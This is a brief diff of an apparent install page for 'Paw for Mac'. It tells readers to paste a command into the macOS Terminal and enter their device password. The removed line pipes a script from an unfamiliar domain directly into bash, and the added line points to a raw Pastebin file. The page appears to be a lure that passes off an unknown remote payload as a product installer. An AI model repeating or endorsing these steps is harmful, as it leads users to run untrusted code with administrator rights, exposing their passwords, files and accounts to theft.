@@ -25,7 +25,7 @@ Get the latest version of **Paw for Mac**:
 
 1. Copy the installation command below.
 ```
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+https://pastebin.com/raw/MzVG09Rv
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
